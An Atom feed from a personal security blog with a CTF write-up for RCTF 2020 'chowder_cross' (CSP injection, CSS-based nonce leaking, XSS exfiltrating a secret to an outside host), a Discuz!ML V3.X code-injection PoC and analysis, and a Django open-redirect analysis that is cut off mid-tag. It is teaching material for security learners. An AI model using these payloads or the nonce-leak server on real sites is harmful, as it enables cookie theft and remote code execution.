<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MuseLJH&#39;s blog</title>
  
  <subtitle>MuseLJH&#39;s blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://museljh.github.io/"/>
  <updated>2020-06-01T05:23:01.486Z</updated>
  <id>https://museljh.github.io/</id>
  
  <author>
    <name>MuseLJH&#39;s blog</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RCTF2020 chowder_cross writeup</title>
    <link href="https://museljh.github.io/2020/06/01/RCTF2020-chowder-cross-writeup/"/>
    <id>https://museljh.github.io/2020/06/01/RCTF2020-chowder-cross-writeup/</id>
    <published>2020-06-01T02:16:48.000Z</published>
    <updated>2020-06-01T05:23:01.486Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RCTF-2020-chowder-cross-writeup"><a href="#RCTF-2020-chowder-cross-writeup" class="headerlink" title="RCTF 2020 chowder_cross writeup"></a>RCTF 2020 chowder_cross writeup</h1><p><img src="https://museljh.oss-cn-beijing.aliyuncs.com/img/hint.png" alt=""></p><h2 id="一-csp-police-inject-firefox-import-css-to-leak-nonce"><a href="#一-csp-police-inject-firefox-import-css-to-leak-nonce" class="headerlink" title="(一) csp police inject + firefox import css to leak nonce"></a>(一) <code>csp police inject + firefox import css to leak nonce</code></h2><h3 id="1-csp-inject"><a href="#1-csp-inject" class="headerlink" title="1. csp inject"></a>1. <code>csp inject</code></h3><p>The csp of the title is as follows: </p><p><img src="https://museljh.oss-cn-beijing.aliyuncs.com/img/185.png" alt=""></p><p>Obviously, the conventional xss payload can not be bypassed.</p><p>But because of the <code>.htaccess</code> of this web challenge is written, and the <code>PHP backend</code> implementation of csp leads to us being able to inject at the csp such as: <code>http://124.156.139.238/xss/?action=post&amp;id=1a3f48b6b2655ba6feeefb38ca9ce492</code></p><p><img src="https://museljh.oss-cn-beijing.aliyuncs.com/img/184.png" alt=""> </p><p>You can refer to the following link to learn it: </p><p><code>https://portswigger.net/research/bypassing-csp-with-policy-injection</code></p><p>however because I have filtered characters such as script, you cannot use methods such as <code>script-src-attr</code> or <code>report</code> to bypass <code>script-src</code> directly, so you need to leak the nonce first.</p><h3 id="2-firefox-import-css-to-leak-nonce"><a href="#2-firefox-import-css-to-leak-nonce" class="headerlink" title="2.firefox import css to leak nonce"></a>2.<code>firefox import css to leak nonce</code></h3><p>The xss bot is using <code>firefox 74.0</code> version, this version is amazing, when the version is higher than <code>74.0</code> you will not be able to use this method of leak nonce because firefox removes the nonce when loading the dom, of course, this situation is greater than <code>60</code> in <code>chrome</code> version Will also happen.And there is also a little knowledge point. When there is a csp, if we want to leak nonce, we can not directly use <code>script [nonce ^ = &quot;a&quot;]</code> to attack like this. We must use other selectors as a part such as <code>script [nonce ^ = &quot;% s &quot;] ~ nav</code>.</p><p>So in the case of filtering keywords such as <code>url</code>, we can use import to import external css  for leak attack,  you can refer to the following article:</p><p><code>https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/</code></p><p>In the end we can compose the following script:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> compression = <span class="built_in">require</span>(<span class="string">'compression'</span>)</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> cssesc = <span class="built_in">require</span>(<span class="string">'cssesc'</span>);</span><br><span class="line"><span class="keyword">const</span> spdy = <span class="built_in">require</span>(<span class="string">'spdy'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.set(<span class="string">'etag'</span>, <span class="literal">false</span>);</span><br><span class="line">app.use(compression());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> SESSIONS = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> POLLING_ORIGIN = <span class="string">`https://example.com:3000`</span>;</span><br><span class="line"><span class="keyword">const</span> LEAK_ORIGIN = <span class="string">`https://example.com:3000`</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">urlencode</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">encodeURIComponent</span>(s).replace(<span class="regexp">/'/g</span>, <span class="string">'%27'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createSession</span>(<span class="params">length = <span class="number">150</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> resolves = [];</span><br><span class="line">    <span class="keyword">let</span> promises = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">        promises[i] = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> resolves[i] = resolve);</span><br><span class="line">    &#125;</span><br><span class="line">    resolves[<span class="number">0</span>](<span class="string">''</span>);</span><br><span class="line">    <span class="keyword">return</span> &#123; promises, resolves &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> CHARSET = <span class="built_in">Array</span>.from(<span class="string">'1234567890/=+QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm'</span>);</span><br><span class="line">app.get(<span class="string">'/polling/:session/:index'</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; session, index &#125; = req.params;</span><br><span class="line">    index = <span class="built_in">parseInt</span>(index);</span><br><span class="line">    <span class="keyword">if</span> (index === <span class="number">0</span> || !(session <span class="keyword">in</span> SESSIONS)) &#123;</span><br><span class="line">        SESSIONS[session] = createSession()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/css'</span>);</span><br><span class="line">    res.set(<span class="string">'Cache-Control'</span>, <span class="string">'no-cache'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> knownValue = <span class="keyword">await</span> SESSIONS[session].promises[index];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> ret = CHARSET.map(<span class="function"><span class="params">char</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`script[nonce^="<span class="subst">$&#123;cssesc(knownValue+char)&#125;</span>"] ~ a &#123; background: url("<span class="subst">$&#123;LEAK_ORIGIN&#125;</span>/leak/<span class="subst">$&#123;session&#125;</span>/<span class="subst">$&#123;urlencode(knownValue+char)&#125;</span>")&#125;`</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line"></span><br><span class="line">    res.send(ret);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/leak/:session/:value'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; session, value &#125; = req.params;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[<span class="subst">$&#123;session&#125;</span>] Leaked value: <span class="subst">$&#123;value&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">    SESSIONS[session].resolves[value.length](value);</span><br><span class="line">    res.status(<span class="number">204</span>).send();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/generate'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> length = req.query.len || <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">const</span> session = <span class="built_in">Math</span>.random().toString(<span class="number">36</span>).slice(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    res.set(<span class="string">'Content-type'</span>, <span class="string">'text/plain'</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">        res.write(<span class="string">`&lt;style&gt;@import '<span class="subst">$&#123;POLLING_ORIGIN&#125;</span>/polling/<span class="subst">$&#123;session&#125;</span>/<span class="subst">$&#123;i&#125;</span>';&lt;/style&gt;\n`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res.send();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">    key: fs.readFileSync(<span class="string">'/etc/ssl/private/private.key'</span>),</span><br><span class="line">    cert:  fs.readFileSync(<span class="string">'/etc/ssl/certs/full_chain.pem'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">3000</span>;</span><br><span class="line">spdy.createServer(options, app).listen(PORT, () =&gt; <span class="built_in">console</span>.log(<span class="string">`Example app listening on port <span class="subst">$&#123;PORT&#125;</span>!`</span>))</span><br></pre></td></tr></table></figure><p>And construct the following payload:</p><p><img src="https://museljh.oss-cn-beijing.aliyuncs.com/img/177.png" alt="177"></p><p>And send the following url to the administrator:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/s example:3000;style-src * &apos;unsafe-inline&apos;;/?action=post&amp;id=9842371276eafb47f7d0ad7befa3ee25</span><br></pre></td></tr></table></figure><p>Next you will receive a nonce from the administrator:</p><p><img src="https://museljh.oss-cn-beijing.aliyuncs.com/img/178.png" alt=""></p><h2 id="二-cover-bypass-RegExp-iframe-xssi"><a href="#二-cover-bypass-RegExp-iframe-xssi" class="headerlink" title="(二) cover bypass RegExp + iframe xssi"></a>(二) <code>cover bypass RegExp + iframe xssi</code></h2><h3 id="1-cover-bypass-RegExp"><a href="#1-cover-bypass-RegExp" class="headerlink" title="1.cover bypass RegExp"></a>1.<code>cover bypass RegExp</code></h3><p>Due to the <code>toString filtering</code> of the front end, we can not directly obtain the flag function, originally we can use <code>uneval</code> or <code>toSource</code> function to bypass in the firefox browser, but here <code>firefox74.0</code> has played a role, in versions higher than <code>74.0</code> In case the <code>Source</code> and <code>uneval</code> functions are disabled, I hooked the <code>uneval</code> function to leave a trap for CTFer, so that they did not find this secret so quickly, because my <code>windows.uneval = noop</code> is too simple, I guess it may Someone will try to bypass it.</p><p>The conventional method is to use <code>iframe</code> to obtain the pure <code>toString function</code> to bypass, but this time due to the front end hook filtered <code>src</code> :</p><p><img src="https://museljh.oss-cn-beijing.aliyuncs.com/img/186.png" alt=""></p><p>So we must first bypass it,My idea is to achieve the bypass effect by overwriting: </p><p><code>RegExp.prototype.test = function(){return false};</code></p><h3 id="2-iframe-xssi"><a href="#2-iframe-xssi" class="headerlink" title="2.iframe xssi"></a>2.<code>iframe xssi</code></h3><p>However, due to the existence of <code>sandbox</code>, iframes are not <code>homologous</code>, so we can not include the flag function in the parent window. But by including the <code>flag function</code> in the iframe and using the pure toString method in the iframe, we can bypass it.  then we can obtain the flag function and take the flag function out, of course due to the existence of csp We also need to inject a csp like this <code>frame-src *</code></p><p>so the final payload is as follows:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=bc36554eab55edbbbc04c995d733085a&gt;RegExp.prototype.test = function()&#123;return false&#125;;var a =&quot;&lt;ifra&quot;.concat(&quot;me sr&quot;,&quot;cdoc=&apos;\x3c\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3d\x22\x68\x74\x74\x70\x3a\x2f\x2f\x31\x32\x34\x2e\x31\x35\x36\x2e\x31\x33\x39\x2e\x32\x33\x38\x2f\x66\x6c\x61\x67\x2e\x70\x68\x70\x3f\x66\x3d\x31\x22\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x3c\x73\x63\x72\x69\x70\x74\x20\x6e\x6f\x6e\x63\x65\x3d\x62\x63\x33\x36\x35\x35\x34\x65\x61\x62\x35\x35\x65\x64\x62\x62\x62\x63\x30\x34\x63\x39\x39\x35\x64\x37\x33\x33\x30\x38\x35\x61\x3e\x6c\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x68\x72\x65\x66\x3d\x22\x68\x74\x74\x70\x73\x3a\x2f\x2f\x78\x73\x73\x2e\x6d\x75\x73\x65\x6c\x6a\x68\x2e\x6c\x69\x76\x65\x2f\x3f\x63\x6f\x6f\x6b\x69\x65\x3d\x22\x2b\x67\x65\x74\x5f\x73\x65\x63\x72\x65\x74\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e&apos;&gt;&quot;);document.body.innerHTML=a;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>And send the following url to the administrator:</p><p><code>/;frame-src *;/?action=post&amp;id=0aaf916cbd820bafc4c88fab90e0130f</code></p><p>You will get the flag following:</p><p><code>flag:RCTF{7JKxVdKaaMD7ZjzMVXBQlC8r}</code></p>]]></content>
    
    <summary type="html">
    
      RCTF2020 chowder_cross writeup
    
    </summary>
    
      <category term="writeup" scheme="https://museljh.github.io/categories/writeup/"/>
    
    
      <category term="xss" scheme="https://museljh.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>Discuz!ML V3.X 代码注入复现与原理分析</title>
    <link href="https://museljh.github.io/2019/07/15/Discuz!ML%20V3.X%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <id>https://museljh.github.io/2019/07/15/Discuz!ML V3.X 代码注入复现与分析/</id>
    <published>2019-07-15T08:51:31.000Z</published>
    <updated>2019-07-15T08:59:24.117Z</updated>
    
    <content type="html"><![CDATA[<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /Discuz/upload/forum.php HTTP/1.1</span><br><span class="line">Host: 169.254.183.180</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: lpAo_2132_saltkey=gJ6FRwO6; lpAo_2132_language=en&apos;.phpinfo().&apos;; lpAo_2132_lastvisit=1563156484; lpAo_2132_sid=G5YO6z; lpAo_2132_lastact=1563160086%09home.php%09misc; lpAo_2132_onlineusernum=1; lpAo_2132_sendmail=1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Discuz 系列建站软件（以下简称DZ）是目前国内部署最为广泛的建站系统，经过多年的发展，已成为集CMS、Forum、Blog等功能为一体的社区系统，并具备完善的插件和模板机制，使得针对DZ进行二次开发变得非常有效率。</p><p>由于Discuz!ML V3.X 的cookie字段中language参数未经过过滤，被拼接后直接写入缓存中，随后缓存又被加载导致了任意代码执行。</p><h2 id="受影响的系统版本"><a href="#受影响的系统版本" class="headerlink" title="受影响的系统版本"></a>受影响的系统版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Discuz! ML v.3.4</span><br><span class="line"></span><br><span class="line">Discuz! ML v.3.3</span><br><span class="line"></span><br><span class="line">Discuz! ML v.3.2</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在debug模式下Poc中扔入过长代码执行会报错.根据debug报错信息进行溯源。</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g50dct8olej31c80cnabo.jpg" alt=""></p><p>以 forum.php 为例，进入模块通常会首先加载内核代码，通过加载 class_core.php 即可，<br>参考源码：<code>require &#39;./source/class/class_core.php&#39;;</code></p><p>内核代码加载完成后，接着加载对应模块的代码，包括对应的函数库、相关类库等等；比如 forum 模块就会加载：</p><p>参考源码：<code>require &#39;./source/function/function_forum.php&#39;;</code></p><p>Dz 每个大模块都是有很多子模块构成，访问或者调用这些子模块通常都是通过 URL 传参数来实现，比如：论坛版块（Forum）可以有论坛版块展示或者帖子内容展示等不同的操作，论坛版块展示则通过加载 forumdisplay 模块来实现，参考源码：<code>require DISCUZ_ROOT.&#39;./source/module/forum/forum_&#39;.$mod.&#39;.php&#39;;</code></p><p><code>其中 $mod 的值就是 forumdisplay，而如果当前操作是帖子内容展示，则 $mod 的值为 viewthread。</code></p><p>Discuz 调用实例：1、<code>”http://www.bacysoft.cn/forum.php?mod=viewthread&amp;tid=57“</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">入口文件：forum.php， /forum.php</span><br><span class="line">模块文件：viewthread，/source/module/forum/forum_viewthread.php</span><br><span class="line">其他参数：tid， 帖子ID号</span><br></pre></td></tr></table></figure><p>我们进入forum.php line:76<br><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g50ivwls60j30nx012aa0.jpg" alt=""></p><p>由于我们并没有加载子模块所以默认$mod为index，forum.php line:49</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g50iwv68jhj30s901ft8n.jpg" alt=""></p><p>进入forum_index.php line:432,被污染的php缓存文件就是从这里被加载进来的<br><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g50izlxc8sj30jf01ndfs.jpg" alt=""></p><p>其中<code>$cachefile</code>因为未对DISCUZ_LANG变量进行过滤为我们可控变量</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g50lmz1fv1j31ga01f74j.jpg" alt=""></p><p>全局搜索<code>DISCUZ_LANG</code>，可以发现在discuz_application.php line:341时对其进行定义</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g50lps62szj30h900x0sl.jpg" alt=""></p><p>可以看到在同文件下discuz_application.php line:305对$lng进行赋值，这里可以清楚看到其中并未对<code>var[&#39;cookie&#39;][&#39;language&#39;]</code>进行任何过滤，这也是该漏洞形成的根本原因<br><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g50ls4b05jj30ry03udg5.jpg" alt=""></p><p>回到function_core.php文件，<br>进入function_core.php line:653</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g50jtnj2jej317g00y3yl.jpg" alt=""></p><p>在经过了一轮的替换<br><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g50l0zdu93j31ax0btq7q.jpg" alt=""></p><p>最后在class_template.php line:105中将缓存写入文件，进行包含，这时该缓存文件并没有被我们污染<br><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g50k1dpzkxj319302xwf1.jpg" alt=""></p><p>但在该缓存文件line:1,进行了再次包含<br><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g50l43t92gj31f601574k.jpg" alt=""></p><p>最终包含了包括该缓存文件共五个文件<br><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g50kn6t95zj30m702vjrk.jpg" alt=""></p><p>其中问题出在<code>en&#39;.phpinfo().&#39;_1_1_common_header_forum_index.tpl.php</code>文件</p><p>可以看到在class_template.php line:30时，将<code>template\default\common\footer.htm</code>文件对$template变量进行赋值</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g50laf9hj7j31gr02caap.jpg" alt=""></p><p>由于footer.htm中 <code>{subtemplate</code>分别在line:1 line:140 line:200 多次出现，导致在<br>，<code>class_template.phpline</code> line:46 时进行回调函数时候对<code>$this-&gt;subtemplates</code>进行赋值</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g50li26hooj31de03ot94.jpg" alt=""></p><p>导致对<code>$headeradd</code>进行赋值，由于<code>$cachefile</code>为可控变量，所以<code>$headeradd</code>也为我们可控的</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g50lkxc6v9j31e404z0tb.jpg" alt=""></p><p>可以看到同样在该文件中，<code>class_template.phpline</code> line:84 将<code>$headeradd</code>变量写入缓存中 这时只要<code>$cachefile</code>里面包含类似<code>&#39;.phpinfo().&#39;</code>就可以将危险的函数嵌入到缓存文件中</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g50m907g1mj311e019mx5.jpg" alt=""></p><p>最后因为缓存文件被包含导致我们的写入的危险函数被执行导致我们可以做到任意代码执行的效果</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/5638" target="_blank" rel="noopener">Discuz!ML V3.X 代码注入分析</a></p><p><a href="https://www.anquanke.com/post/id/181887" target="_blank" rel="noopener">Discuz ML! V3.X 代码注入漏洞深度分析</a></p><p><a href="http://www.bacysoft.cn/thread-126-1-1.html" target="_blank" rel="noopener">Discuz 整体架构及内核浅析一：调用流程（For DzX3.2）</a></p><p><a href="https://www.anquanke.com/post/id/181887" target="_blank" rel="noopener">Discuz ML! V3.X 代码注入漏洞深度分析</a></p>]]></content>
    
    <summary type="html">
    
      对Discuz!ML V3.X 代码注入复现与分析
    
    </summary>
    
      <category term="漏洞分析" scheme="https://museljh.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="cms" scheme="https://museljh.github.io/tags/cms/"/>
    
  </entry>
  
  <entry>
    <title>Django URL跳转漏洞（CVE-2018-14574 ）分析与复现</title>
    <link href="https://museljh.github.io/2019/07/10/Django%20URL%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-14574%20%EF%BC%89%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://museljh.github.io/2019/07/10/Django URL跳转漏洞（CVE-2018-14574 ）分析与复现/</id>
    <published>2019-07-10T06:53:41.000Z</published>
    <updated>2019-07-10T07:03:38.660Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当setting中配置了django.middleware.common.CommonMiddleware且APPEND_SLASH为True时漏洞就会触发，而这两个配置时默认存在的.</span><br></pre></td></tr></table></figure><p>Django处理一个 Request 的过程是首先通过中间件，然后再通过默认的 URL 方式进行的。我们可以在 Middleware 这个地方把所有Request 拦截住，用我们自己的方式完成处理以后直接返回 Response。</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4un72peyfj30hn0fzwhl.jpg" alt=""></p><p>在django项目的settings模块中，有一个 MIDDLEWARE_CLASSES 变量，其中每一个元素就是一个中间件</p><p>you_project.settings.py 42</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4unkaoxsmj30ok06h74w.jpg" alt=""></p><p>在请求阶段，调用视图之前，Django会按照MIDDLEWARE_CLASSES中定义的顺序自顶向下应用中间件</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4uo45q9qkj30m1099td1.jpg" alt=""></p><p>Django处理request的流程大致为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.用户通过浏览器请求一个页面</span><br><span class="line">2.请求到达Request Middlewares，中间件对request做一些预处理或者直接response请求</span><br><span class="line">3.URLConf通过urls.py文件和请求的URL找到相应的View</span><br><span class="line">4.View Middlewares被访问，它同样可以对request做一些处理或者直接返回response</span><br><span class="line">5.调用View中的函数</span><br><span class="line">6.View中的方法可以选择性的通过Models访问底层的数据</span><br><span class="line">7.所有的Model-to-DB的交互都是通过manager完成的</span><br><span class="line">8.如果需要，Views可以使用一个特殊的Context</span><br><span class="line">9.Context被传给Template用来生成页面</span><br><span class="line">a.Template使用Filters和Tags去渲染输出</span><br><span class="line">b.输出被返回到View</span><br><span class="line">c.HTTPResponse被发送到Response Middlewares</span><br><span class="line">d.任何Response Middlewares都可以丰富response或者返回一个完全不同的response</span><br><span class="line">e.Response返回到浏览器，呈现给用户</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上述流程中最主要的几个部分分别是：Middleware(中间件，包括request, view, exception, response)，URLConf(url映射关系)，Template(模板系统)</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4uolu7gdfj30lb0mutcg.jpg" alt=""></p><p>Django中，Middleware可以渗入处理流程的四个阶段：request，view，response和exception</p><p>相应的，在每个Middleware类中都有<code>process_request，process_view， process_response 和 process_exception</code>这四个方法。</p><p>Middleware是在Django BaseHandler的load_middleware方法执行时加载的，加载之后会建立四个列表作为处理器的实例变量</p><p>其中在请求阶段，调用视图之前，Django会按照MIDDLEWARE_CLASSES中定义的顺序自顶向下应用中间件。会用到两个钩子：<br><code>process_request();process_view();</code></p><p>其中CommonMiddleware是Django中一个通用中间件，实质上是一个类，位于site-packages/django/middleware/common.py，会执行一些HTTP请求的基础操作</p><p>当我们发起类似<code>http://127.0.0.1:8000//www.baidu.com</code>的请求，会先进入site-packages/django/middleware/common.py  42，中process_request()钩子</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4uowoknotj30vd0ihdi4.jpg" alt=""></p><p>当url进入site-packages/django/middleware/common.py  60 进入<code>should_redirect_with_slash</code>函数先判断url是否需要</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4upcru9hnj30o7048dg2.jpg" alt=""></p><p>site-packages/django/middleware/common.py  70</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4updkgj6bj30sd08qmy5.jpg" alt=""></p><p>如果url不全时，进入<code>get_full_path</code>函数site-packages/django/middleware/common.py 61</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4upcru9hnj30o7048dg2.jpg" alt=""></p><p>进入<code>get_full_path_with_slash函数</code></p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4upkmjgckj30sk0e5gng.jpg" alt=""></p><p>可以看到通过<code>new_path = request.get_full_path(force_append_slash=True)</code>获取了新的path,且<code>force_append_slash</code>为True</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4upqdqmbij30p0017gli.jpg" alt=""></p><p>进入<code>get_full_path</code>函数</p><p>site-packages/django/http/request.py 115</p><p>可以看到由于<code>force_append_slash=True</code>对Path进行补全并返回新的path,<code>//baidu.com/</code></p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4ups9ilynj313x063wfb.jpg" alt=""></p><p>进入<code>response_redirect_class函数</code>,它是HTTP跳转的一个基类</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4uq1rq6pyj30st0280st.jpg" alt=""></p><blockquote><p>以//开头的外部URL将由浏览器翻译为协议、绝对URL</p></blockquote><p>site-packages/django/http/response.py 427</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4uq4ioia8j30pk01qgll.jpg" 